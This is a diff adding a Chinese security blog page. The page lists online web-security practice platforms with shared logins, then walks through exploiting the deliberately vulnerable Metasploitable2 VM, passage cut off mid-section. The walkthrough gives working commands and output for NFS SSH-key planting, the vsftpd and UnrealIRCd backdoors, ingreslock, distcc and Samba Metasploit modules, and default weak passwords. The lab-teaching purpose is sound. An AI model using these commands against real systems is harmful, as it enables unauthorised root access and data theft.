@@ -1,0 +1,1259 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/blog.github.io/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/blog.github.io/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/blog.github.io/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog.github.io/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog.github.io/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog.github.io/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/blog.github.io/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="部署," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Web安全在线练习平台大家平台在学习web安全的时候是不是苦于寻找练手平台？是不是苦于搭建各种环境？《网络安全法》出台，更不能随意的拿网上的站点去学习。没关系，我们看雪WEB安全小组与比格云合作，为大家提供了线上练习平台。 这个平台主要包括：DVWA、OWASP Bricks、OWASP WebGoat、SQLi-Labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透靶机及安装">
+<meta property="og:url" content="https://github.com/magic-2020/blog.github.io/2020/03/29/%E7%8E%AF%E5%A2%83-%E5%86%85%E7%BD%91%E4%B8%8EWiFi%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="Magic">
+<meta property="og:description" content="Web安全在线练习平台大家平台在学习web安全的时候是不是苦于寻找练手平台？是不是苦于搭建各种环境？《网络安全法》出台，更不能随意的拿网上的站点去学习。没关系，我们看雪WEB安全小组与比格云合作，为大家提供了线上练习平台。 这个平台主要包括：DVWA、OWASP Bricks、OWASP WebGoat、SQLi-Labs">
+<meta property="og:locale">
+<meta property="og:image" content="https://github.com/blog.github.io/images/50431400425310.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/48311400425312.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/29351400425315.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/98591400425318.png">
+<meta property="og:image" content="https://github.com/blog.github.io/images/64181400425320.png">
+<meta property="article:published_time" content="2020-03-29T13:11:55.000Z">
+<meta property="article:modified_time" content="2022-08-04T02:51:31.441Z">
+<meta property="article:author" content="magic">
+<meta property="article:tag" content="部署">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/blog.github.io/images/50431400425310.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://github.com/magic-2020/blog.github.io/2020/03/29/环境-内网与WiFi同时使用/"/>
+
+
+
+
+
+  <title>渗透靶机及安装 | Magic</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/blog.github.io/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Magic</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">try everyday</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/blog.github.io/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/blog.github.io/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/blog.github.io/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/blog.github.io/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/blog.github.io/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/magic-2020/blog.github.io/blog.github.io/2020/03/29/%E7%8E%AF%E5%A2%83-%E5%86%85%E7%BD%91%E4%B8%8EWiFi%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/blog.github.io/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Magic">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透靶机及安装</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-29T21:11:55+08:00">
+                2020-03-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog.github.io/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog.github.io/categories/%E5%AE%89%E5%85%A8/%E7%8E%AF%E5%A2%83/" itemprop="url" rel="index">
+                    <span itemprop="name">环境</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Web安全在线练习平台"><a href="#Web安全在线练习平台" class="headerlink" title="Web安全在线练习平台"></a>Web安全在线练习平台</h1><p>大家平台在学习web安全的时候是不是苦于寻找练手平台？是不是苦于搭建各种环境？《网络安全法》出台，更不能随意的拿网上的站点去学习。没关系，我们看雪WEB安全小组与比格云合作，为大家提供了线上练习平台。</p>
+<p>这个平台主要包括：<strong>DVWA、OWASP Bricks、OWASP WebGoat、SQLi-Labs</strong></p>
+<span id="more"></span>
+
+<p>简单介绍一下这几个平台：</p>
+<h2 id="1-DVWA"><a href="#1-DVWA" class="headerlink" title="1.DVWA"></a>1.DVWA</h2><p>DVWA是著名的OWASP开放出来的一个在线web安全教、学平台。提供了：暴力破解、命令执行、CSRF、文件包含、SQL注入、XSS学习环境，并且分：low、medium、high三种不同的安全等级，等级越高难度也越大。同时每一个漏洞可以直接在页面选择查看源码进行源码对比学习。</p>
+<p>地址：<a target="_blank" rel="noopener" href="http://43.247.91.228:81/">http://43.247.91.228:81</a></p>
+<p>账号：admin</p>
+<p>密码：password（为了大家都可以使用这个平台，尽量不要去改密码哈~）</p>
+<h2 id="2-OWASP-Bricks"><a href="#2-OWASP-Bricks" class="headerlink" title="2.OWASP Bricks"></a>2.OWASP Bricks</h2><p>这个也是OWASP放出来的一个web安全学习平台，PHP+MySQL，主要有SQL注入练习及简单绕过。</p>
+<p>地址：<a target="_blank" rel="noopener" href="http://43.247.91.228:83/">http://43.247.91.228:83/</a></p>
+<p>如果不能正常练习，进入：<a target="_blank" rel="noopener" href="http://43.247.91.228:83/config/">http://43.247.91.228:83/config/</a> 然后reset就可以了。</p>
+<h2 id="3-WebGoat"><a href="#3-WebGoat" class="headerlink" title="3.WebGoat"></a>3.WebGoat</h2><p>WebGoat是一个用于讲解典型web漏洞的基于J2EE架构的web应用，他由著名的WEB应用安全研究组织OWASP精心设计并不断更新。WebGoat本身是一系列教程，其中设计了大量的web缺陷，一步步的指导用户如何去利用这些漏洞进行攻击，同时也指出了如何在程序设计和编码时避免这些漏洞。Web应用程序的设计者和测试者都可以在WebGoat中找到自己感兴趣的部分。虽然WebGoat中对于如何利用漏洞给出了大量的解释，但是还是比较有限，尤其是对于初学者来说，但觉得这正是其特色之处：WebGoat的每个教程都明确告诉你存在什么漏洞，但是如何去攻破要你自己去查阅资料，了解该漏洞的原理、特征和攻击方法，甚至要自己去找攻击辅助工具，当你成功时，WebGoat会给出一个红色的Congratulation，让你很有成就感！</p>
+<p>地址：<a target="_blank" rel="noopener" href="http://43.247.91.228:82/WebGoat/">http://43.247.91.228:82/WebGoat/</a></p>
+<h2 id="4-SQLi-Labs"><a href="#4-SQLi-Labs" class="headerlink" title="4.SQLi-Labs"></a><strong>4.SQLi-Labs</strong></h2><p>SQLi-Labs SQL注入练习平台，主要用来web安全学习者学习sql注入之用，类似闯关模式。欢迎使用~</p>
+<p>地址：<a target="_blank" rel="noopener" href="http://43.247.91.228:84/">http://43.247.91.228:84/</a></p>
+<p>原文：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-218653.htm">https://bbs.pediy.com/thread-218653.htm</a></p>
+<h1 id="离线靶机"><a href="#离线靶机" class="headerlink" title="离线靶机"></a>离线靶机</h1><h2 id="Metasploitable2"><a href="#Metasploitable2" class="headerlink" title="Metasploitable2"></a>Metasploitable2</h2><p>Metasploitable2 虚拟系统是一个特别制作的ubuntu操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。版本2已经可以下载，并且比上一个版本包含更多可利用的安全漏洞。这个版本的虚拟系统兼容VMware，VirtualBox,和其他虚拟平台。默认只开启一个网络适配器并且开启NAT和Host-only，本镜像一定不要暴漏在一个易受攻击的网络中。</p>
+<p><strong>开始工作</strong></p>
+<p>当虚拟系统启动之后，使用用户名<em><strong>msfadmin</strong></em>，和密码***msfadmin***登陆。使用shell运行ifconfig命令来确认IP地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfadmin@metasploitable:~$ ifconfig </span><br><span class="line">eth0    Link encap:Ethernet  HWaddr 00:0c:29:9a:52:c1  </span><br><span class="line">        inet addr:192.168.99.131  Bcast:192.168.99.255  Mask:255.255.255.0</span><br><span class="line">        inet6 addr: fe80::20c:29ff:fe9a:52c1/64 Scope:Link</span><br><span class="line">        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br></pre></td></tr></table></figure>
+
+<p><strong>服务</strong></p>
+<p>作为攻击者的操作系统（linux，大多数时候使用BackTrack），我们需要在虚拟机中通过使用nmap来辨认开放的端口。接下来的命令能够扫描目标系统-Metasploitable 2的所有TCP端口。</p>
+<p>root@ubuntu:~# <strong>nmap -p0-65535 192.168.99.131</strong></p>
+<p>Starting Nmap 5.61TEST4 ( <a target="_blank" rel="noopener" href="http://nmap.org/">http://nmap.org</a> ) at 2012-05-31 21:14 PDT</p>
+<p>Nmap scan report for 192.168.99.131</p>
+<p>Host is up (0.00028s latency).</p>
+<p>Not shown: 65506 closed ports</p>
+<p>PORT   STATE SERVICE</p>
+<p>21/tcp  open ftp</p>
+<p>22/tcp  open ssh</p>
+<p>23/tcp  open telnet</p>
+<p>25/tcp  open smtp</p>
+<p>53/tcp  open domain</p>
+<p>80/tcp  open http</p>
+<p>111/tcp  open rpcbind</p>
+<p>139/tcp  open netbios-ssn</p>
+<p>445/tcp  open microsoft-ds</p>
+<p>512/tcp  open exec</p>
+<p>513/tcp  open login</p>
+<p>514/tcp  open shell</p>
+<p>1099/tcp open rmiregistry</p>
+<p>1524/tcp open ingreslock</p>
+<p>2049/tcp open nfs</p>
+<p>2121/tcp open ccproxy-ftp</p>
+<p>3306/tcp open mysql</p>
+<p>3632/tcp open distccd</p>
+<p>5432/tcp open postgresql</p>
+<p>5900/tcp open vnc</p>
+<p>6000/tcp open X11</p>
+<p>6667/tcp open irc</p>
+<p>6697/tcp open unknown</p>
+<p>8009/tcp open ajp13</p>
+<p>8180/tcp open unknown</p>
+<p>8787/tcp open unknown</p>
+<p>39292/tcp open unknown</p>
+<p>43729/tcp open unknown</p>
+<p>44813/tcp open unknown</p>
+<p>55852/tcp open unknown</p>
+<p>MAC Address: 00:0C:29:9A:52:C1 (VMware)</p>
+<p>目标系统中几乎每一个端口监听的服务都给我们提供一个远程接入点。在接下来的章节中，我们将会漫步于这些路径之中。</p>
+<p><strong>服务：Unix基础</strong></p>
+<p>TCP端口512,513和514为著名的rlogin提供服务。在系统中被错误配置从而允许远程访问者从任何地方访问（标准的，rhosts + +）。要利用这个配置，确保rsh客户端已经安装（在ubuntu上），然后以root权限运行下列命令，如果被提示需要一个SSH秘钥，这表示rsh客户端没有安装，ubuntu一般默认使用SSH。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rlogin -l root 192.168.99.131</span></span><br><span class="line">Last login: Fri Jun  1 00:10:39 EDT 2012 from :0.0 on pts/0</span><br><span class="line">Linux metasploitable 2.6.24-16-server <span class="comment">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span></span><br></pre></td></tr></table></figure>
+
+<p>这是如此轻而易举办到。接下来我们要查看的是网络文件系统（NFS)。NFS可以通过扫描2049端口或者查询端口映射程序的服务列表进行确认。下面的列子我们将通过rpcinfo来确认NFS,通过showmount -e 来确定“ /”共享（文件系统的根目录）已经被导出。我们需要安装ubuntu中的rpcbind和nfs-common的依赖包。</p>
+<p>root@ubuntu:~# <strong>rpcinfo -p 192.168.99.131</strong></p>
+<p>  program vers proto  port service</p>
+<p>  100000  2  tcp  111 portmapper</p>
+<p>  100000  2  udp  111 portmapper</p>
+<p>  100024  1  udp 53318 status</p>
+<p>  100024  1  tcp 43729 status</p>
+<p>  100003  2  udp  2049 nfs</p>
+<p>  100003  3  udp  2049 nfs</p>
+<p>  100003  4  udp  2049 nfs</p>
+<p>  100021  1  udp 46696 nlockmgr</p>
+<p>  100021  3  udp 46696 nlockmgr</p>
+<p>  100021  4  udp 46696 nlockmgr</p>
+<p>  <strong>100003  2  tcp  2049 nfs</strong></p>
+<p>  <strong>100003  3  tcp  2049 nfs</strong></p>
+<p>  <strong>100003  4  tcp  2049 nfs</strong></p>
+<p>  100021  1  tcp 55852 nlockmgr</p>
+<p>  100021  3  tcp 55852 nlockmgr</p>
+<p>  100021  4  tcp 55852 nlockmgr</p>
+<p>  100005  1  udp 34887 mountd</p>
+<p>  100005  1  tcp 39292 mountd</p>
+<p>  100005  2  udp 34887 mountd</p>
+<p>  100005  2  tcp 39292 mountd</p>
+<p>  100005  3  udp 34887 mountd</p>
+<p>  100005  3  tcp 39292 mountd</p>
+<p>root@ubuntu:~# <strong>showmount -e 192.168.99.131</strong></p>
+<p>Export list for 192.168.99.131:</p>
+<p><strong>/ *</strong></p>
+<p>获取一个系统的可写入的文件系统权限是很简单的。我们需要在攻击者的系统上创建一个新的SSH秘钥，挂载NFS接口，然后把我们的秘钥添加到root使用者账号的认证秘钥文件里：</p>
+<p>root@ubuntu:~# <strong>ssh-keygen</strong> </p>
+<p>Generating public/private rsa key pair.</p>
+<p>Enter file in which to save the key (/root/.ssh/id_rsa): </p>
+<p>Enter passphrase (empty for no passphrase): </p>
+<p>Enter same passphrase again: </p>
+<p>Your identification has been saved in /root/.ssh/id_rsa.</p>
+<p>Your public key has been saved in /root/.ssh/id_rsa.pub.</p>
+<p>root@ubuntu:~# <strong>mkdir /tmp/r00t</strong></p>
+<p>root@ubuntu:~# <strong>mount -t nfs 192.168.99.131:/ /tmp/r00t/</strong></p>
+<p>root@ubuntu:~# <strong>cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/r00t/root/.ssh/authorized_keys</strong> </p>
+<p>root@ubuntu:~# <strong>umount /tmp/r00t</strong> </p>
+<p>root@ubuntu:~# <strong>ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#57;&#x39;&#46;&#x31;&#x33;&#x31;">&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#57;&#x39;&#46;&#x31;&#x33;&#x31;</a></strong></p>
+<p>Last login: Fri Jun 1 00:29:33 2012 from 192.168.99.128</p>
+<p>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</p>
+<p><strong>服务：后门</strong></p>
+<p>Metasploitable2 在21端口上运行着vsftpd服务，一个使用广泛的FTP服务。这个特别的版本包含一个后门允许一个未知的入侵者进入核心代码。这个后门很快就被确认并且移除。但是移除之前已经被少数人下载下来。如果在发送的用户名后面加上”：）“（笑脸符号），这个版本的后门会在6200端口上打开一个监听的shell。我们可以通过telnet确认或者通过metasploit上面的攻击模块自动攻击。</p>
+<p>root@ubuntu:~# <strong>telnet 192.168.99.131 21</strong></p>
+<p>Trying 192.168.99.131…</p>
+<p>Connected to 192.168.99.131.</p>
+<p>Escape character is &#039;^]&#039;.</p>
+<p>220 (vsFTPd 2.3.4)</p>
+<p><strong>user backdoored:)</strong></p>
+<p>331 Please specify the password.</p>
+<p><strong>pass invalid</strong></p>
+<p><strong>^]</strong></p>
+<p>telnet&gt; <strong>quit</strong></p>
+<p>Connection closed.</p>
+<p>root@ubuntu:~# <strong>telnet 192.168.99.131 6200</strong></p>
+<p>Trying 192.168.99.131…</p>
+<p>Connected to 192.168.99.131.</p>
+<p>Escape character is &#039;^]&#039;.</p>
+<p><strong>id;</strong></p>
+<p>uid=0(root) gid=0(root)</p>
+<p>在Metasploitable2 的6667端口上运行着UnreaIRCD IRC的守护进程。这个版本包含一个后门-运行了几个月都没被注意到。通过在一个系统命令后面添加两个字母”AB“发送给被攻击服务器任意一个监听该端口来触发。metasploit上已经已经有攻击模块来获得一个交互的shell，请看下面列子。</p>
+<p>msfconsole</p>
+<p>msf &gt; <strong>use exploit/unix/irc/unreal_ircd_3281_backdoor</strong></p>
+<p>msf exploit(unreal_ircd_3281_backdoor) &gt; <strong>set RHOST 192.168.99.131</strong></p>
+<p>msf exploit(unreal_ircd_3281_backdoor) &gt; <strong>exploit</strong> </p>
+<p>[*] Started reverse double handler</p>
+<p>[*] Connected to 192.168.99.131:6667…</p>
+<p>  :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname..</p>
+<p>  :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn&#039;t resolve your host   name; using your IP address instead</p>
+<p>[*] Sending backdoor command…</p>
+<p>[*] Accepted the first client connection…</p>
+<p>[*] Accepted the second client connection…</p>
+<p>[*] Command: echo 8bMUYsfmGvOLHBxe;</p>
+<p>[*] Writing to socket A</p>
+<p>[*] Writing to socket B</p>
+<p>[*] Reading from sockets…</p>
+<p>[*] Reading from socket B</p>
+<p>[*] B: “8bMUYsfmGvOLHBxe\r\n”</p>
+<p>[*] Matching…</p>
+<p>[*] A is input…</p>
+<p>[*] Command shell session 1 opened (192.168.99.128:4444 -&gt; 192.168.99.131:60257) at 2012-05-31 21:53:59 -0700</p>
+<p><strong>id</strong></p>
+<p>uid=0(root) gid=0(root)</p>
+<p>在少数服务器上存在一个古老的令人惊讶的“ingreslock”后门，监听1524端口。在过去的十年里，它经常被用于入侵一个暴露的服务器。它的利用是如此简单。</p>
+<p>root@ubuntu:~# <strong>telnet 192.168.99.131 1524</strong></p>
+<p>Trying 192.168.99.131…</p>
+<p>Connected to 192.168.99.131.</p>
+<p>Escape character is &#039;^]&#039;.</p>
+<p>root@metasploitable:/# <strong>id</strong></p>
+<p>uid=0(root) gid=0(root) groups=0(root)</p>
+<p><strong>服务：无意识的后门</strong></p>
+<p>除了上个部分介绍的恶意的后门以外，一些程序的性质本身就类似后门。Metasploitable2 最先安装的是distccd。这个程序可以使大量代码在网络服务器上进行分布式编译。问题是攻击者可以滥用它来实现一些他们想运行的命令。metasploit在下面例子里证明。</p>
+<p><strong>msfconsole</strong></p>
+<p>msf &gt; <strong>use exploit/unix/misc/distcc_exec</strong> </p>
+<p>msf exploit(distcc_exec) &gt; <strong>set RHOST 192.168.99.131</strong></p>
+<p>msf exploit(distcc_exec) &gt; <strong>exploit</strong> </p>
+<p>[*] Started reverse double handler</p>
+<p>[*] Accepted the first client connection…</p>
+<p>[*] Accepted the second client connection…</p>
+<p>[*] Command: echo uk3UdiwLUq0LX3Bi;</p>
+<p>[*] Writing to socket A</p>
+<p>[*] Writing to socket B</p>
+<p>[*] Reading from sockets…</p>
+<p>[*] Reading from socket B</p>
+<p>[*] B: “uk3UdiwLUq0LX3Bi\r\n”</p>
+<p>[*] Matching…</p>
+<p>[*] A is input…</p>
+<p>[*] Command shell session 1 opened (192.168.99.128:4444 -&gt; 192.168.99.131:38897) at 2012-05-31 22:06:03 -0700</p>
+<p><strong>id</strong></p>
+<p>uid=1(daemon) gid=1(daemon) groups=1(daemon)</p>
+<p>samba，当配置为文件权限可写同时”wide links” 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。下面例子里，metasploit提供一个攻击模块，允许接入一个root文件系统通过一个匿名接入和可写入的共享设置。</p>
+<p>root@ubuntu:~# <strong>smbclient -L //192.168.99.131</strong></p>
+<p>Anonymous login successful</p>
+<p>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]</p>
+<p>​    Sharename    Type   Comment</p>
+<p>​    ———    —-   ——-</p>
+<p>​    print$     Disk   Printer Drivers</p>
+<p>​    <strong>tmp       Disk   oh noes!</strong></p>
+<p>​    opt       Disk   </p>
+<p>​    IPC$      IPC    IPC Service (metasploitable server (Samba 3.0.20-Debian))</p>
+<p>​    ADMIN$     IPC    IPC Service (metasploitable server (Samba 3.0.20-Debian))</p>
+<p>root@ubuntu:~# <strong>msfconsole</strong></p>
+<p>msf &gt; <strong>use auxiliary/admin/smb/samba_symlink_traversal</strong> </p>
+<p>msf auxiliary(samba_symlink_traversal) &gt; <strong>set RHOST 192.168.99.131</strong></p>
+<p>msf auxiliary(samba_symlink_traversal) &gt; <strong>set SMBSHARE tmp</strong></p>
+<p>msf auxiliary(samba_symlink_traversal) &gt; <strong>exploit</strong> </p>
+<p>[*] Connecting to the server…</p>
+<p>[*] Trying to mount writeable share &#039;tmp&#039;…</p>
+<p>[*] Trying to link &#039;rootfs&#039; to the root filesystem…</p>
+<p>[*] Now access the following share to browse the root filesystem:</p>
+<p>[*]   \192.168.99.131\tmp\rootfs\</p>
+<p>msf auxiliary(samba_symlink_traversal) &gt; <strong>exit</strong></p>
+<p>root@ubuntu:~# <strong>smbclient //192.168.99.131/tmp</strong></p>
+<p>Anonymous login successful</p>
+<p>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]</p>
+<p>smb: &gt; <strong>cd rootfs</strong></p>
+<p>smb: \rootfs&gt; <strong>cd etc</strong></p>
+<p>smb: \rootfs\etc&gt; <strong>more passwd</strong></p>
+<p>getting file \rootfs\etc\passwd of size 1624 as /tmp/smbmore.ufiyQf (317.2 KiloBytes/sec) (average 317.2 KiloBytes/sec)</p>
+<p>root:x:0:0:root:/root:/bin/bash</p>
+<p>daemon:x:1:1:daemon:/usr/sbin:/bin/sh</p>
+<p>bin:x:2:2:bin:/bin:/bin/sh</p>
+<p>[..]</p>
+<p><strong>弱口令</strong></p>
+<p>除了上面介绍的公开的后门和错误配置以外，Metasploit2 上不管是系统还是数据口账户都有非常严重的弱口令问题。最初的管理员登陆密码和登录名***msfadmin***相同。通过查看系统的用户名表，我们可以通过使用缺陷来捕获passwd文件，或者通过Samba枚举这些用户，或者通过暴力破解来获得账号密码。系统中至少有一下弱口令。</p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>Account Name</strong></th>
+<th align="left"><strong>Password</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">msfadmin</td>
+<td align="left">msfadmin</td>
+</tr>
+<tr>
+<td align="left">user</td>
+<td align="left">user</td>
+</tr>
+<tr>
+<td align="left">postgres</td>
+<td align="left">postgres</td>
+</tr>
+<tr>
+<td align="left">sys</td>
+<td align="left">batman</td>
+</tr>
+<tr>
+<td align="left">klog</td>
+<td align="left">123456789</td>
+</tr>
+<tr>
+<td align="left">service</td>
+<td align="left">service</td>
+</tr>
+</tbody></table>
+<p>除了这些系统层面的账户，PostgreSQL 服务可以通过默认的用户名postgres和密码postgres登陆。MySQL 服务也开放，用户名为root同时为空口令。VNC服务提供一个远程桌面接入服务通过使用默认的密码password可以登陆。</p>
+<p><strong>易受攻击的web服务</strong></p>
+<p>Metasploitable2特意预装了易受攻击的web应用。当系统启动以后web服务会自动运行。访问web应用的方法是，打开一浏览器然后输入网址[http://&gt; ,<IP> 就是系统的IP地址。</p>
+<p>在这个例子里，系统运行IP地址 192.168.56.101. 打开 <a target="_blank" rel="noopener" href="http://192.168.56.101/">http://192.168.56.101/</a> 来查看web应用的主页。</p>
+<p><a target="_blank" rel="noopener" href="https://community.rapid7.com/servlet/JiveServlet/showImage/102-1875-12-2135/metasploitable-web-home-page.png"><img src="/blog.github.io/images/50431400425310.png" alt="metasploitable-web-home-page.png"></a></p>
+<p>访问特定的web应用可以点击首页的超链接。如果个人的web应用如果需要被访问，需要在后面增加特定的文件路径。[http://&gt; 来创建URL http://<IP>/&lt;应用文件夹&gt;/。举个例子，Mutillidae 需要被访问，在这个例子访问地址为<a target="_blank" rel="noopener" href="http://192.168.56.101/mutillidae/%E3%80%82%E8%80%8C%E8%BF%99%E4%B8%AA%E5%BA%94%E7%94%A8%E8%A2%AB%E5%AE%89%E8%A3%85%E5%9C%A8%E7%B3%BB%E7%BB%9F">http://192.168.56.101/mutillidae/。而这个应用被安装在系统</a> /var/www 这个文件夹里。（注：可以通过以下命令查看 ls /var/www)。</p>
+<p>在写这篇文章的当前版本，所有web应用程序</p>
+<ul>
+<li><pre><code class="html">mutillidae (NOWASP Mutillidae 2.1.19)
+dvwa (Damn Vulnerable Web Application)
+phpMyAdmin
+tikiwiki (TWiki)
+tikiwiki-old
+dav (WebDav)
+</code></pre>
+</li>
+</ul>
+<p><strong>易受攻击的web服务：*<em>Mutillidae*</em></strong></p>
+<p>Mutillidae web应用包含OWASP 上前十可利用的攻击漏洞，包括HTML-5 web storage, forms caching, and click-jacking等。收DVWA启发，Mutillidae 允许使用者更改安全等级从0（完全没有安全意识）到5（安全）。另外提供三个层次，从“0级-我自己搞”（不要提示）到“2级-小白”（使劲提示）。如果Mutillidae在我们使用注入攻击或者黑的过程中搞坏了，点击”Reset DB” 按钮回复出厂设置。</p>
+<p><a target="_blank" rel="noopener" href="https://community.rapid7.com/servlet/JiveServlet/showImage/2138/mutillidae-home-page.png"><img src="/blog.github.io/images/48311400425312.png" alt="mutillidae-home-page.png"></a></p>
+<p>通过单击菜单栏上的”切换提示”按钮启用应用程序中的提示：</p>
